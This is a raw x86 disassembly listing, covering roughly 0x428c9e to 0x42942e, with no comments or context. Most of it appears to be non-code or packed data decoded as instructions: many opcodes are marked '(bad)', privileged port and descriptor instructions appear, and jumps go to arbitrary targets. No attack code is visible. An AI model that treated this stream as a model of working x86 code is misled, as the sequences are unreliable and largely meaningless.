  428c9e:	sbb    bh,0x1
  428ca1:	retf   
  428ca2:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428ca9:	dec    ebp
  428caa:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428cb0:	enter  0x12de,0xdf
  428cb4:	inc    ebp
  428cb5:	pop    ebp
  428cb6:	dec    DWORD PTR [ebx-0x257f0ff4]
  428cbc:	add    DWORD PTR [edx],edx
  428cbe:	add    BYTE PTR [ebp+0x50],dl
  428cc1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428cc7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428ccd:	or     ah,al
  428ccf:	pop    ss
  428cd0:	cdq    
  428cd1:	push   ebp
  428cd2:	clc    
  428cd3:	mov    eax,DWORD PTR [ebp-0x4]
  428cd6:	xor    edx,edx
  428cd8:	add    esi,DWORD PTR [ebx]
  428cda:	cmp    eax,DWORD PTR [ebx]
  428cdc:	hlt    
  428cdd:	cmp    DWORD PTR [ebx],esp
  428cdf:	or     al,BYTE PTR [ebp+0xf]
  428ce2:	mov    eax,DWORD PTR [edx]
  428ce4:	loopne 0x428ce6
  428ce6:	(bad)  
  428ce7:	mov    ecx,esi
  428ce9:	cld    
  428cea:	pushf  
  428ceb:	pop    ebp
  428cec:	cwde   
  428ced:	mov    esi,DWORD PTR [edx]
  428cef:	lock mov eax,eax
  428cf2:	adc    BYTE PTR [ebx],al
  428cf4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cfb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428d01:	dec    ebp
  428d02:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428d08:	(bad)  
  428d09:	iret   
  428d0a:	inc    ebp
  428d0b:	(bad)  
  428d0c:	jne    0x428d5b
  428d0e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428d14:	(bad)  
  428d15:	cmp    ebx,eax
  428d17:	je     0x428c9f
  428d19:	add    edi,edi
  428d1b:	or     bh,bh
  428d1d:	dec    ebp
  428d1e:	inc    ebp
  428d1f:	mov    esi,DWORD PTR [ebx]
  428d21:	cld    
  428d22:	add    ecx,esi
  428d24:	cmp    ecx,DWORD PTR [eax-0xc]
  428d27:	mov    edx,DWORD PTR [edi]
  428d29:	or     BYTE PTR [ebp-0x7c],al
  428d2c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d32:	test   BYTE PTR [eax+ebx*4],cl
  428d35:	inc    ebp
  428d36:	xor    bh,BYTE PTR ds:0x8be89c89
  428d3c:	out    dx,eax
  428d3d:	adc    BYTE PTR [eax],al
  428d3f:	jne    0x428d08
  428d41:	mov    ebp,esp
  428d43:	fcomp  DWORD PTR [ebx]
  428d45:	add    BYTE PTR [ecx],al
  428d47:	inc    DWORD PTR [ebp-0x75]
  428d4a:	mov    ?,esp
  428d4c:	add    al,0xce
  428d4e:	mov    ecx,edi
  428d50:	cld    
  428d51:	inc    ebp
  428d52:	fidivr WORD PTR [ebx]
  428d54:	fbstp  TBYTE PTR [ebp-0x3e]
  428d57:	mov    eax,DWORD PTR [eax]
  428d59:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d5f:	fadd   st,st(7)
  428d61:	add    BYTE PTR [ebp-0x1],al
  428d64:	mov    ecx,DWORD PTR [esp+edi*8]
  428d67:	inc    ebp
  428d68:	mov    bh,0xc7
  428d6b:	loopne 0x428db2
  428d6d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d73:	add    DWORD PTR [ebx],esi
  428d75:	pushf  
  428d76:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d7c:	mov    eax,edi
  428d7e:	cwde   
  428d7f:	inc    ebp
  428d80:	inc    ebp
  428d81:	jne    0x428d0e
  428d83:	mov    esp,esp
  428d85:	clc    
  428d86:	add    al,0x4d
  428d88:	mov    DWORD PTR [ebx],esi
  428d8a:	or     al,0x33
  428d8c:	inc    ebp
  428d8d:	lea    ecx,[ebx-0x398d13fd]
  428d93:	add    bh,al
  428d95:	inc    ebp
  428d96:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d9d:	add    ebp,esp
  428d9f:	shufps xmm1,xmm3,0xc7
  428da3:	(bad)  
  428da4:	jmp    0x7487c8cd
  428da9:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428daf:	hlt    
  428db0:	mov    ecx,DWORD PTR [edi]
  428db2:	fadd   DWORD PTR [ebp+0x0]
  428db5:	xor    ecx,DWORD PTR [edi]
  428db7:	add    ecx,ecx
  428db9:	cmp    edi,edi
  428dbb:	pmuludq mm7,QWORD PTR [edx+0x50]
  428dbf:	(bad)  
  428dc0:	jmp    0x428d4d
  428dc2:	mov    edi,esp
  428dc4:	or     al,0xc6
  428dc6:	inc    ebp
  428dc7:	(bad)  
  428dc8:	mov    eax,DWORD PTR [ebp+0x10]
  428dcb:	jne    0x428d56
  428dcd:	mov    eax,DWORD PTR [ecx]
  428dcf:	clc    
  428dd0:	add    BYTE PTR [ebp-0x40],cl
  428dd3:	xor    edx,DWORD PTR [eax-0x73]
  428dd6:	jne    0x428dd9
  428dd8:	push   DWORD PTR [edx+0x8]
  428ddb:	add    BYTE PTR [ebp+0x45],al
  428dde:	mov    ebp,ecx
  428de0:	cld    
  428de1:	add    BYTE PTR [ebp+0x0],cl
  428de4:	xor    eax,DWORD PTR [ebp+0x3]
  428de7:	mov    al,0x3b
  428de9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428def:	sub    eax,0x5d330e4d
  428df4:	lea    esi,[ebx]
  428df6:	add    DWORD PTR [ebx],eax
  428df8:	jb     0x428de3
  428dfa:	add    BYTE PTR [eax],al
  428dfc:	inc    ebp
  428dfd:	add    bl,ch
  428dff:	inc    ebp
  428e00:	mov    esi,DWORD PTR [ebx]
  428e02:	or     al,0x3
  428e04:	(bad)  
  428e05:	mov    edi,eax
  428e07:	in     al,dx
  428e08:	scas   eax,DWORD PTR es:[edi]
  428e09:	inc    ebp
  428e0a:	mov    esi,DWORD PTR [ebx]
  428e0c:	in     al,0x3
  428e0e:	add    al,0x89
  428e10:	mov    ecx,DWORD PTR [eax+edi*8]
  428e13:	dec    ebp
  428e14:	(bad)  
  428e15:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428e1c:	mov    ecx,eax
  428e1e:	cld    
  428e1f:	push   es
  428e20:	dec    ebp
  428e21:	add    al,0x33
  428e23:	mov    DWORD PTR [ebx],eax
  428e25:	in     al,dx
  428e26:	cmp    DWORD PTR [ebp-0x67],eax
  428e29:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e2f:	mov    edx,DWORD PTR [ebp-0x4]
  428e32:	mov    ecx,DWORD PTR [ebp-0x18]
  428e35:	xor    ecx,DWORD PTR [ebp+0x3]
  428e38:	cmp    DWORD PTR [ebx],0x8b327497
  428e3e:	xor    edi,esp
  428e40:	jmp    0xff768b92
  428e45:	add    ecx,DWORD PTR [ebp-0x3f]
  428e48:	xor    ebx,DWORD PTR [edi]
  428e4a:	add    eax,ecx
  428e4c:	cmp    ebx,DWORD PTR [eax]
  428e4e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e51:	mov    ecx,DWORD PTR [eax]
  428e53:	adc    BYTE PTR [ebp-0x80],al
  428e56:	jmp    0x428e59
  428e58:	mov    eax,DWORD PTR [eax]
  428e5a:	cld    
  428e5b:	mov    bh,0xc6
  428e5d:	push   ecx
  428e5e:	(bad)  
  428e5f:	jne    0x428ebf
  428e61:	dec    ecx
  428e63:	or     BYTE PTR [ecx+ebx*1],cl
  428e66:	push   ebp
  428e67:	inc    ebp
  428e68:	in     al,dx
  428e69:	add    ebp,esp
  428e6b:	or     bh,al
  428e6d:	dec    ebp
  428e6e:	cld    
  428e6f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e75:	cmp    DWORD PTR [ecx],0x2
  428e78:	pushf  
  428e79:	dec    DWORD PTR [ebx+0x45510cf4]
  428e7f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e85:	mov    edx,DWORD PTR [ecx+0xc]
  428e88:	xor    eax,esi
  428e8a:	mov    edx,0xc172c7
  428e8f:	inc    ebp
  428e90:	mov    esi,DWORD PTR [ebp+0x8]
  428e93:	mov    eax,edx
  428e95:	call   0x84c7558a
  428e9a:	add    DWORD PTR [eax-0x76bace00],ebx
  428ea0:	mov    ebp,eax
  428ea2:	or     BYTE PTR [eax],dl
  428ea4:	jo     0x428ef3
  428ea6:	push   edi
  428ea7:	xor    esi,DWORD PTR [ebp+0x3]
  428eaa:	(bad)  
  428eab:	pmulhuw mm0,mm1
  428eae:	test   DWORD PTR [ebp-0x8],ecx
  428eb1:	mov    DWORD PTR [ebp-0x67],eax
  428eb4:	mov    eax,DWORD PTR [ebp-0x4]
  428eb7:	xor    edi,DWORD PTR [ebp-0x73]
  428eba:	xor    eax,DWORD PTR [ebx]
  428ebc:	xor    esi,DWORD PTR [edx+0x3]
  428ebf:	add    BYTE PTR [ecx],bh
  428ec1:	inc    ebp
  428ec2:	(bad)  
  428ec3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ec9:	mov    DWORD PTR [eax],0x750f0004
  428ecf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428ed5:	lock add BYTE PTR [ebp+0x0],al
  428ed9:	mov    esi,DWORD PTR [ebp-0x2c]
  428edc:	mov    ebp,edx
  428ede:	or     al,0x72
  428ee0:	ja     0x428ee2
  428ee2:	mov    edx,esi
  428ee4:	cld    
  428ee5:	(bad)  
  428ee8:	cli    
  428ee9:	mov    esi,DWORD PTR [ebp-0x4]
  428eec:	cmp    ecx,esi
  428eee:	bswap  edi
  428ef0:	(bad)
  428ef4:	mov    esi,DWORD PTR [ebp-0x4]
  428ef7:	mov    esi,ecx
  428ef9:	clc    
  428efa:	repnz add esi,DWORD PTR [ebp+0x45]
  428efe:	push   ebx
  428eff:	xor    eax,DWORD PTR [ebp+0x3]
  428f02:	cmp    ebx,DWORD PTR [edi-0x64]
  428f05:	pop    ebx
  428f06:	jmp    0x428fcd
  428f0b:	mov    esi,DWORD PTR [ebp-0x7d]
  428f0e:	xor    ebp,DWORD PTR [eax]
  428f10:	lea    eax,[ebp-0x8]
  428f13:	cmp    dl,dh
  428f15:	pushf  
  428f16:	out    dx,eax
  428f17:	(bad)  
  428f18:	neg    eax
  428f1a:	ins    DWORD PTR es:[edi],dx
  428f1b:	test   esi,edi
  428f1d:	clc    
  428f1e:	pop    esp
  428f1f:	inc    ebp
  428f20:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f26:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f2c:	add    cl,al
  428f2e:	jne    0x428ec8
  428f30:	mov    esi,DWORD PTR [edx]
  428f32:	in     al,dx
  428f33:	push   esi
  428f34:	xor    BYTE PTR [ebp-0xe],dh
  428f37:	add    edi,esi
  428f39:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f3f:	add    cl,bh
  428f41:	mov    edi,DWORD PTR [ebp+0x8]
  428f44:	mov    DWORD PTR [ebp-0x14],esi
  428f47:	add    esi,DWORD PTR [ebp+0x3c]
  428f4a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f50:	mov    ah,0x3d
  428f52:	cwde   
  428f53:	pushf  
  428f54:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f5a:	jne    0x428ee7
  428f5c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f5f:	icebp  
  428f60:	icebp  
  428f61:	shl    edx,0xf2
  428f64:	(bad)  
  428f65:	mov    ah,0x16
  428f67:	cmp    BYTE PTR [ebp-0x6d],dh
  428f6a:	mov    ecx,DWORD PTR [edi]
  428f6c:	in     al,dx
  428f6d:	jmp    0x428f60
  428f6f:	add    dl,dh
  428f71:	mov    edi,esi
  428f73:	or     al,0x8
  428f75:	inc    ebp
  428f76:	jne    0x428f7b
  428f78:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f7e:	ret    
  428f7f:	or     bh,bh
  428f81:	jge    0x428f6b
  428f83:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f89:	xor    edi,eax
  428f8b:	add    esi,DWORD PTR [ebp-0x77]
  428f8e:	mov    ebx,esp
  428f90:	clc    
  428f91:	neg    DWORD PTR [ebp-0x7c]
  428f94:	xor    eax,DWORD PTR [eax]
  428f96:	cmp    eax,DWORD PTR [eax]
  428f98:	repz jne 0x428f30
  428f9b:	xor    eax,DWORD PTR [ecx]
  428f9d:	add    ebx,DWORD PTR [eax]
  428f9f:	mov    DWORD PTR [ebp-0x8],eax
  428fa2:	mov    eax,edi
  428fa4:	cld    
  428fa5:	lock pop eax
  428fa7:	test   DWORD PTR [ebx],esi
  428fa9:	clc    
  428faa:	add    edx,DWORD PTR [edi-0x740bff77]
  428fb0:	fdivp  st(4),st
  428fb2:	test   ecx,esi
  428fb4:	(bad)  
  428fb5:	jnp    0x428fb6
  428fb7:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428fbd:	jae    0x428f4a
  428fbf:	sub    edi,esp
  428fc1:	(bad)  
  428fc2:	shl    DWORD PTR [eax-0x3e],0x89
  428fc6:	leave  
  428fc7:	call   0x819846d4
  428fcc:	in     al,dx
  428fcd:	(bad)  
  428fce:	in     al,dx
  428fcf:	add    bh,al
  428fd1:	mov    esp,edi
  428fd3:	in     al,dx
  428fd4:	test   DWORD PTR [ebp-0x8],edi
  428fd7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fda:	cmp    DWORD PTR [ebx],eax
  428fdc:	pushf  
  428fdd:	jnp    0x57318c16
  428fe3:	xor    edx,DWORD PTR [eax-0x77]
  428fe6:	push   ecx
  428fe7:	loopne 0x42901c
  428fe9:	jne    0x428fa6
  428feb:	mov    esi,DWORD PTR [edx-0x20]
  428fee:	add    BYTE PTR [ebp-0x3d],bh
  428ff1:	xor    eax,DWORD PTR [ebp-0x73]
  428ff4:	mov    edi,DWORD PTR [esi]
  428ff6:	cld    
  428ff7:	jb     0x428fbf
  428ff9:	add    bl,al
  428ffb:	jne    0x429042
  428ffd:	mov    edx,DWORD PTR [edi-0x10]
  429000:	jge    0x42907f
  429002:	mov    esi,DWORD PTR [ebx]
  429004:	lock add ecx,DWORD PTR [ebp+0x3b]
  429008:	xor    esi,DWORD PTR [ebp-0x77]
  42900b:	mov    esi,eax
  42900d:	lock inc ebp
  42900f:	jge    0x429049
  429011:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  429018:	dec    ebp
  429019:	mov    esi,DWORD PTR [ebx]
  42901b:	loopne 0x428fa6
  42901d:	jge    0x429017
  42901f:	add    DWORD PTR [ebp-0x7d],eax
  429022:	clc    
  429023:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42902a:	dec    ebp
  42902b:	hlt    
  42902c:	xor    ebx,DWORD PTR [ebp-0x77]
  42902f:	mov    esi,esp
  429031:	in     al,0x45
  429033:	jge    0x429071
  429035:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42903c:	dec    ebp
  42903d:	cmp    al,0x33
  42903f:	xchg   ebx,eax
  429040:	mov    DWORD PTR [ebx-0x14],esi
  429043:	add    eax,DWORD PTR [ebp-0xc]
  429046:	cmp    BYTE PTR [ebp-0x61],dh
  429049:	mov    edi,DWORD PTR [eax+0xf19504]
  42904f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429053:	cmp    eax,DWORD PTR [ebp+0xf]
  429056:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42905a:	fistp  WORD PTR [ebx+0x0]
  42905d:	inc    ebp
  42905e:	mov    ebx,DWORD PTR [edi+0xc]
  429061:	add    eax,eax
  429063:	inc    ebp
  429064:	test   BYTE PTR [ebx],dh
  429066:	add    eax,DWORD PTR [ebx]
  429068:	add    BYTE PTR [esi+0x45],bl
  42906b:	ret    0x85
  42906e:	jnp    0x5443143d
  429074:	inc    bp
  429076:	inc    ebp
  429077:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42907d:	fdiv   QWORD PTR [ebx]
  42907f:	test   DWORD PTR [ecx+0x453af8],edi
  429085:	push   ebx
  429086:	add    edi,DWORD PTR [esi+0x708088b]
  42908c:	cmp    esi,eax
  42908e:	sets   BYTE PTR [ecx-0x74fcffce]
  429095:	mov    esp,edi
  429097:	call   0x33cdd5e9
  42909c:	or     BYTE PTR [ebx],al
  42909e:	inc    ecx
  42909f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4290a5:	and    BYTE PTR [ebp-0x7074f0bb],al
  4290ab:	lock add cl,al
  4290ae:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4290b5:	mov    ch,0x45
  4290b7:	clc    
  4290b8:	xor    eax,DWORD PTR [ebp+0x3]
  4290bb:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290c1:	inc    ebp
  4290c2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290c8:	mov    edi,eax
  4290ca:	mov    eax,DWORD PTR [ebp+0x3c]
  4290cd:	mov    ecx,DWORD PTR [eax]
  4290cf:	hlt    
  4290d0:	inc    ebp
  4290d1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290d8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290de:	push   ebp
  4290df:	mov    edi,DWORD PTR [ebx]
  4290e1:	in     al,dx
  4290e2:	jne    0x4290a5
  4290e4:	mov    eax,DWORD PTR [ebp-0x28]
  4290e7:	add    DWORD PTR [eax],0xe8058dec
  4290ed:	clc    
  4290ee:	mov    esp,DWORD PTR [edi-0x8]
  4290f1:	add    dh,dl
  4290f3:	rol    WORD PTR [ebp-0x1],cl
  4290f7:	mov    edx,DWORD PTR [eax+0x8]
  4290fa:	jne    0x4290bc
  4290fc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  429103:	inc    ebp
  429104:	push   esp
  429105:	test   DWORD PTR [ecx+0xf],ecx
  429108:	sub    edx,esp
  42910a:	add    eax,DWORD PTR [eax]
  42910c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  429112:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  429119:	mov    eax,DWORD PTR [ecx]
  42911b:	and    BYTE PTR [eax],al
  42911d:	adc    BYTE PTR ss:[eax],al
  429120:	inc    ebp
  429121:	inc    cx
  429124:	push   esp
  429125:	cld    
  429126:	jne    0x429128
  429128:	push   edx
  429129:	enterw 0xc1,0x4d
  42912e:	mov    esp,DWORD PTR [esi+0x20]
  429131:	add    DWORD PTR [ecx-0x7b],eax
  429134:	add    eax,DWORD PTR [ebx]
  429136:	str    WORD PTR [eax+0x45]
  42913a:	lea    ecx,[ebx+0x45890801]
  429140:	sbb    BYTE PTR [ebx],al
  429142:	dec    ebp
  429143:	cmp    al,0xf
  429145:	inc    ebp
  429146:	push   eax
  429147:	mov    esi,DWORD PTR [ebx]
  429149:	push   eax
  42914a:	add    eax,eax
  42914c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429153:	inc    ebp
  429154:	add    BYTE PTR [eax],bh
  429156:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42915d:	(bad)  
  42915e:	mov    ebx,eax
  429160:	loopne 0x4291a7
  429162:	dec    ebp
  429163:	mov    ecx,DWORD PTR [edi]
  429165:	cld    
  429166:	push   eax
  429167:	xchg   DWORD PTR [ebx],esi
  429169:	add    DWORD PTR [ebx],ebp
  42916b:	add    BYTE PTR [ebx],ch
  42916d:	or     BYTE PTR [ecx],bh
  42916f:	dec    ecx
  429170:	loopne 0x429175
  429172:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429178:	push   ebp
  429179:	add    DWORD PTR [ebx+0x55100800],eax
  42917f:	dec    ebp
  429180:	jmp    0x42910b
  429182:	mov    esp,DWORD PTR [eax]
  429184:	sbb    dl,dl
  429186:	inc    eax
  429187:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42918d:	add    BYTE PTR [ebx+0x74528555],cl
  429193:	push   ebp
  429194:	div    DWORD PTR [ebx]
  429196:	and    eax,DWORD PTR [ebx]
  429198:	add    edx,DWORD PTR [edx-0x30]
  42919b:	jno    0x429128
  42919d:	inc    DWORD PTR [eax+eiz*1]
  4291a0:	inc    ebp
  4291a1:	push   eax
  4291a2:	push   eax
  4291a3:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4291a9:	mov    edi,esp
  4291ab:	push   eax
  4291ac:	inc    ebp
  4291ad:	enter  0x458b,0x8
  4291b1:	push   ecx
  4291b2:	(bad)  
  4291b3:	call   0x10c9b8b
  4291b8:	pop    ss
  4291b9:	push   ebp
  4291ba:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291c0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291c6:	push   ecx
  4291c7:	jo     0x4291b1
  4291c9:	inc    DWORD PTR [edi]
  4291cb:	or     BYTE PTR [eax],al
  4291cd:	call   0xcd9917
  4291d2:	fmul   QWORD PTR [ebp+0x55]
  4291d5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291db:	mov    bh,0x8c
  4291dd:	adc    al,0x98
  4291df:	dec    esp
  4291e0:	xor    bl,BYTE PTR [eax]
  4291e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291e5:	mov    eax,DWORD PTR [ebp-0x4]
  4291e8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ee:	push   es
  4291ef:	retf   
  4291f0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291f4:	inc    ebp
  4291f5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291fc:	retf   0x83fc
  4291ff:	into   
  429200:	dec    ebp
  429201:	retf   
  429202:	mov    ecx,DWORD PTR [ebp-0x74]
  429205:	mov    eax,DWORD PTR [eax]
  429207:	fdiv   QWORD PTR [ebx]
  429209:	mov    bh,0x3
  42920b:	push   es
  42920c:	mov    esi,ecx
  42920e:	sbb    cl,dl
  429210:	dec    ebp
  429211:	sar    DWORD PTR [ebx],cl
  429213:	push   ebp
  429214:	jne    0x429225
  429216:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42921c:	lea    ebx,[eax]
  42921e:	call   0xf4cc1de5
  429223:	sbb    dh,dl
  429225:	add    edx,ebx
  429227:	push   ebp
  429228:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42922e:	push   ecx
  42922f:	mov    DWORD PTR [eax-0x30],edx
  429232:	test   DWORD PTR [edx],eax
  429234:	xadd   esp,esi
  429237:	pop    es
  429238:	add    cl,dl
  42923a:	mov    eax,ecx
  42923c:	or     al,0x45
  42923e:	(bad)  
  42923f:	push   eax
  429240:	add    DWORD PTR [edx+0x0],eax
  429243:	add    ecx,DWORD PTR [ecx]
  429245:	and    dh,cl
  429247:	call   0xc69b17
  42924c:	add    DWORD PTR [ebp+0x0],edx
  42924f:	mov    esp,DWORD PTR [ebp+0x18]
  429252:	add    BYTE PTR [eax+0x44],cl
  429255:	xor    eax,DWORD PTR [eax]
  429257:	add    esp,DWORD PTR [esi+0x3b]
  42925a:	inc    ebp
  42925b:	je     0x4291e0
  42925d:	push   ecx
  42925e:	or     cl,BYTE PTR [ebp-0x77]
  429261:	add    eax,esi
  429263:	or     al,0x5e
  429265:	inc    eax
  429266:	add    BYTE PTR [ebx],al
  429268:	data16 and BYTE PTR [ebp+0x50],al
  42926c:	sub    DWORD PTR [ecx],0xffffffe8
  42926f:	add    BYTE PTR [ebp-0x75],ah
  429272:	add    BYTE PTR [eax],bl
  429274:	enter  0x894d,0x8b
  429278:	int3   
  429279:	loopne 0x4292ad
  42927b:	rol    BYTE PTR [eax],0x33
  42927e:	lea    cx,[ebp+0xa]
  429282:	data16 jb 0x4292ca
  429285:	add    BYTE PTR [ebx+0x44890855],cl
  42928b:	sbb    ah,al
  42928d:	inc    ebp
  42928e:	lldt   WORD PTR ss:[edx+0x66]
  429293:	xor    ecx,DWORD PTR [eax]
  429295:	sub    edi,esp
  429297:	mov    eax,DWORD PTR [eax]
  429299:	or     al,0x66
  42929b:	ror    edx,cl
  42929d:	dec    ebp
  42929e:	inc    ebp
  42929f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4292a5:	cld    
  4292a6:	or     BYTE PTR [edi+0x4501dd],dl
  4292ac:	(bad)  
  4292ad:	into   
  4292ae:	out    dx,al
  4292af:	retf   
  4292b0:	(bad)  
  4292b1:	dec    ebp
  4292b2:	mov    al,0x8b
  4292b4:	jmp    0xea27:0x450ac320
  4292bb:	xchg   esi,ebp
  4292bd:	add    edi,eax
  4292bf:	add    BYTE PTR [eax+0x3f52e955],bh
  4292c5:	push   ebp
  4292c6:	inc    ebp
  4292c7:	xor    ebx,esp
  4292c9:	add    ebp,esi
  4292cb:	push   edx
  4292cc:	push   bp
  4292ce:	inc    ebp
  4292cf:	(bad)  
  4292d0:	in     eax,dx
  4292d1:	push   esp
  4292d2:	(bad)  
  4292d3:	inc    edx
  4292d5:	sbb    al,0x33
  4292d7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292de:	add    BYTE PTR [ebp+0x43],0x8b
  4292e2:	jmp    0xf98b:0x100041c8
  4292e9:	xor    esi,DWORD PTR [edx+0x3]
  4292ec:	mov    ecx,DWORD PTR [edi]
  4292ee:	fmul   DWORD PTR [edx]
  4292f0:	add    BYTE PTR [eax],al
  4292f2:	lea    eax,[ebx-0x4700273c]
  4292f8:	add    al,0x4f
  4292fa:	pop    DWORD PTR [eax]
  4292fc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  429302:	push   edx
  429303:	inc    WORD PTR [ebp+0x8]
  429307:	mov    eax,0x514f4d
  42930c:	(bad)
  429310:	add    al,al
  429312:	xor    DWORD PTR [ebx-0x74baf730],eax
  429318:	test   DWORD PTR [esi+0x74],esp
  42931b:	inc    ebp
  42931c:	mov    DWORD PTR [eax+0xa4f08],edi
  429322:	add    BYTE PTR [ecx-0x76c435bb],cl
  429328:	or     dh,cl
  42932a:	or     eax,0x8b8d5045
  42932f:	inc    ebp
  429330:	mov    WORD PTR [ecx+0x3b8a00],?
  429336:	jne    0x42936b
  429338:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42933e:	add    DWORD PTR [ebx],eax
  429340:	add    bh,bh
  429342:	adc    DWORD PTR [eax],ecx
  429344:	adc    DWORD PTR [ebp+0x55],edi
  429347:	push   es
  429348:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42934e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429355:	inc    ebp
  429356:	mov    esp,edi
  429358:	or     al,0xdc
  42935a:	push   eax
  42935b:	(bad)  
  42935c:	jne    0x429312
  42935e:	call   0x3a8c4f
  429363:	inc    ebp
  429364:	rol    dl,0x84
  429367:	out    dx,al
  429368:	add    bh,al
  42936a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429371:	(bad)  
  429372:	and    al,al
  429374:	fs in  eax,dx
  429376:	inc    DWORD PTR [ebp-0x7b]
  429379:	js     0x42938a
  42937b:	leave  
  42937c:	scas   al,BYTE PTR es:[edi]
  42937d:	inc    esp
  42937e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429385:	or     BYTE PTR [ebx-0x97717c5],0x83
  42938c:	call   DWORD PTR [edi]
  42938e:	shr    ah,0x84
  429391:	xchg   DWORD PTR [eax],eax
  429393:	add    DWORD PTR [eax],eax
  429395:	add    bh,bh
  429397:	dec    ebp
  429398:	and    BYTE PTR [ecx-0x38],dl
  42939b:	push   eax
  42939c:	dec    DWORD PTR [ebx+0xfd885]
  4293a2:	mov    BYTE PTR [ebp+0x508bac00],cl
  4293a8:	mov    WORD PTR [ecx+0x0],ss
  4293ab:	lea    ecx,[ebx+0x108b20d8]
  4293b1:	mov    WORD PTR [edx],ds
  4293b3:	add    BYTE PTR [edi+0xff01ff],al
  4293b9:	mov    ecx,DWORD PTR [ebp-0x28]
  4293bc:	push   ecx
  4293bd:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293c1:	inc    ebp
  4293c2:	in     al,0xeb
  4293c4:	jno    0x429351
  4293c6:	push   edx
  4293c7:	mov    DWORD PTR [eax-0x28],edx
  4293ca:	mov    eax,DWORD PTR [ebp+0x20]
  4293cd:	je     0x429356
  4293cf:	mov    eax,DWORD PTR [ecx]
  4293d1:	sbb    BYTE PTR [eax],al
  4293d3:	pop    DWORD PTR [eax]
  4293d5:	add    esi,eax
  4293d7:	add    bl,al
  4293d9:	adc    DWORD PTR [edi],esi
  4293db:	jmp    0x8bcde42d
  4293e0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293e7:	jne    0x429374
  4293e9:	mov    ecx,DWORD PTR [eax]
  4293eb:	in     al,0x75
  4293ed:	pop    DWORD PTR [ecx+0x5001]
  4293f3:	push   edx
  4293f4:	inc    DWORD PTR [ebx]
  4293f6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293fc:	add    BYTE PTR [edi+0x9],dl
  4293ff:	call   DWORD PTR [esi]
  429401:	and    dl,al
  429403:	and    bh,bh
  429405:	inc    edi
  429407:	test   eax,edx
  429409:	sldt   ebx
  42940c:	cmp    DWORD PTR [eax],eax
  42940e:	pushf  
  42940f:	(bad)  
  429410:	jmp    0x42941e
  429412:	mov    eax,edi
  429414:	or     al,0x75
  429416:	inc    eax
  429417:	call   0x428b1f
  42941c:	mov    eax,eax
  42941e:	loopne 0x4293a4
  429420:	inc    ebp
  429421:	add    BYTE PTR [ebx+0x1451c00],cl
  429427:	mov    eax,DWORD PTR [ebp+0x20]
  42942a:	add    edi,ecx
  42942c:	add    BYTE PTR [eax],ch
  42942e:	cmp    edi,0x18
